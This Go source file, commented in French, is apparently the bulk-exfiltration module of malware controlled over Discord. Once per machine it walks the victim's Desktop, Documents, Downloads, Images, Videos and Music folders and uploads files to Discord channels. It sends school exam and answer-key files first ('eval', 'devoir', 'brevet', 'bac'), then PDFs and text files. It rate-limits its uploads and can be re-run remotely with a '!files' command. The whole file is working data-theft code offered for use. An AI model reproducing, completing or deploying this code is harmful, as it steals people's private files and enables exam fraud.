// bulk.go — première extraction massive des dossiers utilisateur.
//
// Une seule fois par poste (marqueur `.bulk-done`), le payload parcourt
// Bureau, Documents, Téléchargements, Images, Vidéos et Musique. Les fichiers
// sont triés avant l'envoi : d'abord ce qui ressemble à une évaluation
// (« eval », « contrôle », « devoir », brevet, bac…), puis les PDF et les
// textes, puis le reste. Tout part, mais l'utile part en premier — sur une
// grosse arborescence, c'est la différence entre voir les copies dans la
// première minute et les voir après deux heures.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync/atomic"
	"time"
)

const (
	bulkMaxFiles = 400
	bulkMaxBytes = 200 * 1024 * 1024
	bulkMaxTime  = 30 * time.Minute
)

var (
	bulkRunning atomic.Bool
	bulkDone    atomic.Bool
)

func bulkMarker() string { return workPath(".bulk-done") }

// fold retire accents et casse : « Évaluation » et « evaluation » doivent se
// reconnaître.
func fold(s string) string {
	var b strings.Builder
	for _, r := range strings.ToLower(s) {
		switch r {
		case 'é', 'è', 'ê', 'ë':
			b.WriteRune('e')
		case 'à', 'â', 'ä':
			b.WriteRune('a')
		case 'î', 'ï':
			b.WriteRune('i')
		case 'ô', 'ö':
			b.WriteRune('o')
		case 'ù', 'û', 'ü':
			b.WriteRune('u')
		case 'ç':
			b.WriteRune('c')
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// evalWords : ce qui, dans un nom de fichier, signale un travail scolaire à
// récupérer en priorité.
var evalWords = []string{
	"eval", "controle", "devoir", "examen", "brevet", "bac", "corrig",
	"fiche", "interrogation",
}

// fileScore classe un fichier : plus le score est haut, plus il part tôt.
func fileScore(name string) int {
	low := fold(name)
	score := 0
	for _, w := range evalWords {
		if strings.Contains(low, w) {
			score += 100
			break
		}
	}
	switch strings.ToLower(filepath.Ext(name)) {
	case ".pdf":
		score += 60
	case ".txt":
		score += 55
	case ".doc", ".docx", ".odt", ".rtf":
		score += 40
	case ".xls", ".xlsx", ".csv", ".ods":
		score += 25
	case ".jpg", ".jpeg", ".png":
		score += 10
	}
	return score
}

type bulkFile struct {
	path  string
	size  int64
	score int
}

// collectBulkFiles parcourt les dossiers et rend la liste triée par priorité.
func collectBulkFiles(roots []string) []bulkFile {
	var files []bulkFile
	seen := map[string]bool{}
	for _, root := range roots {
		_ = filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
			if err != nil || info == nil {
				return nil
			}
			if skipExfil(p, info) {
				if info.IsDir() {
					return filepath.SkipDir
				}
				return nil
			}
			if info.IsDir() {
				return nil
			}
			if seen[p] || info.Size() == 0 || info.Size() > exfilMaxBytes {
				return nil
			}
			seen[p] = true
			files = append(files, bulkFile{path: p, size: info.Size(), score: fileScore(info.Name())})
			return nil
		})
	}
	sort.SliceStable(files, func(i, j int) bool {
		if files[i].score != files[j].score {
			return files[i].score > files[j].score
		}
		return files[i].size < files[j].size // les petits d'abord à score égal
	})
	return files
}

// bulkUploadAll lance l'extraction initiale. force permet de la relancer à la
// demande (`!files`).
func bulkUploadAll(force bool) string {
	if bulkRunning.Load() {
		return "extraction massive déjà en cours."
	}
	if !force {
		if _, err := os.Stat(bulkMarker()); err == nil {
			bulkDone.Store(true)
			return ""
		}
	}
	bulkRunning.Store(true)
	defer bulkRunning.Store(false)
	bulkDone.Store(true)

	roots := exfilRoots()
	if len(roots) == 0 {
		return "aucun dossier utilisateur accessible."
	}
	files := collectBulkFiles(roots)
	if len(files) == 0 {
		return "aucun fichier à envoyer dans les dossiers utilisateur."
	}

	count, sent := 0, 0
	deadline := time.Now().Add(bulkMaxTime)
	for _, f := range files {
		if stopped.Load() || count >= bulkMaxFiles || sent >= bulkMaxBytes || time.Now().After(deadline) {
			break
		}
		ch := exfilChannelFor(f.path)
		if ch == "" {
			continue
		}
		data, err := os.ReadFile(f.path)
		if err != nil {
			continue
		}
		sendFilesTo(ch, fileOut{Name: filepath.Base(f.path), Data: data})
		count++
		sent += len(data)
		if count%15 == 0 {
			plog(fmt.Sprintf("bulk: %d fichiers, %d Mo", count, sent/1024/1024))
		}
		time.Sleep(650 * time.Millisecond) // limite de débit Discord
	}

	if !force {
		_ = os.WriteFile(bulkMarker(), []byte(time.Now().Format(time.RFC3339)), 0600)
	}
	plog(fmt.Sprintf("bulk: terminé — %d fichiers, %d Mo", count, sent/1024/1024))
	return fmt.Sprintf("extraction massive : **%d fichiers** envoyés (%d Mo), évaluations et PDF en premier.",
		count, sent/1024/1024)
}
